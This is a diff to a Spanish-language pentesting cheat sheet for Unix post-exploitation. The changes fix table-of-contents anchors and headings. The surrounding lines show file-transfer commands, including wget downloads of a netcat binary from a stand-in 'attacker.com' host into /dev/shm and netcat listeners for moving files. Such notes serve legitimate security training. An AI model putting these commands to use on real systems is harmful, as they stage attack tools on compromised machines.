@@ -16,13 +16,13 @@
   - [Spawneando una shell mejor](#Spawning-a-TTY-shell)   
   - [Transferencia de Archivos](#Transfiriendo-Archivos)
     - [HTTP](#HTTP)
-      - [Python](#Python)
-      - [Python3](#Python)
-      - [Apache](#Python)
-      - [Php](#Php)
+      - [Python](#Python_t)
+      - [Python3](#Python3_t)
+      - [Apache](#Apache)
+      - [Php](#PHP_t)
     - [Curl](#Curl)
     - [Wget](#Wget)
-    - [NetCat](#NetCat)
+    - [NetCat](#NetCat_t)
     - [/dev/tcp/](#/dev/tcp)
     - [FTP](#FTP)
     - [SCP](#SCP)
@@ -89,7 +89,7 @@ Técnicas para utilizar en sistemas basados en unix
 ## Transfiriendo archivos
 
 ### HTTP
-#### Python
+#### Python_t
   ```bash
   python -m SimpleHTTPServer 80
   ```
@@ -102,7 +102,7 @@ Técnicas para utilizar en sistemas basados en unix
   sudo service start apache2
   sudo systemctl apache2 start
   ```
-#### PHP
+#### PHP_t
   ```bash
   php -S 0.0.0.0:8080
   ```
@@ -115,7 +115,7 @@ Técnicas para utilizar en sistemas basados en unix
   wget http://attacker.com/nc # current directory
   wget http://attacker.com/nc -O /dev/shm/nc # Setting output path
   ```
-### NetCat
+### NetCat_t
   ```bash
   target -> nc -lvp 4444 > FileToTransfer
   source -> nc targetip 4444 -w 3 < FileToTransfer (w representa un tiempo de espera en seg para archivos muy grandes)
